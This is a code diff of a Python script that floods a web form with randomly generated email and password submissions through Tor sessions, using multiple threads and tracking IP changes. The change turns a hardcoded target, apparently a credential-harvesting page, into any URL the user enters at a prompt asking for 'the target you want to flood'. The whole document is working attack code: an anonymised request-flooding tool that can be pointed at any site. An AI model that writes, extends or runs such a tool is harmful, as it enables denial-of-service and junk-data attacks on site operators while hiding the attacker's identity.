@@ -94,9 +94,9 @@ def generate_random_password():  # Generate password using uppercase, lowercase,
     length = random.randint(12, 20)  # Random length between 12 and 20
     return "".join(random.choice(characters) for _ in range(length))
 
-def func_attack(email, password, session, num_posts_per_ip_change): # Sends a POST request to the target URL with the email and password
-    url = 'https://web.bit-box.digital/block-onauth.php'
-    data = {'a': email, 'az': password}
+def func_attack(urlu, email, password, session, num_posts_per_ip_change): # Sends a POST request to the target URL with the email and password
+    url = urlu
+    data = {'ai': email, 'namep': password}
     
     try:
         current_ip = whats_my_ip()
@@ -121,6 +121,9 @@ def func_attack(email, password, session, num_posts_per_ip_change): # Sends a PO
         print(f"Error: {e}")
 
 if __name__ == "__main__":
+
+    url = input("Enter the URL of the target you want to flood: ")
+
     user_agents = func_get_user_agents()
     if not user_agents:
         print("Unable to retrieve user agents. Using default user agents.")
@@ -171,14 +174,14 @@ if __name__ == "__main__":
         session = create_tor_session()
 
         if choice == 1:
-            posting_thread = threading.Thread(target=func_attack, args=(random_email, random_password, session, 1), daemon=True)
+            posting_thread = threading.Thread(target=func_attack, args=(url, random_email, random_password, session, 1), daemon=True)
             posting_thread.start()
         elif choice == 2:
-            threads = [threading.Thread(target=func_attack, args=(random_email, random_password, session, 0), daemon=True) for _ in range(25)]
+            threads = [threading.Thread(target=func_attack, args=(url, random_email, random_password, session, 0), daemon=True) for _ in range(25)]
             for t in threads:
                 t.start()
         elif choice == 3:
-            posting_thread = threading.Thread(target=func_attack, args=(random_email, random_password, session, 2), daemon=True)
+            posting_thread = threading.Thread(target=func_attack, args=(url, random_email, random_password, session, 2), daemon=True)
             posting_thread.start()
 
         time.sleep(1)
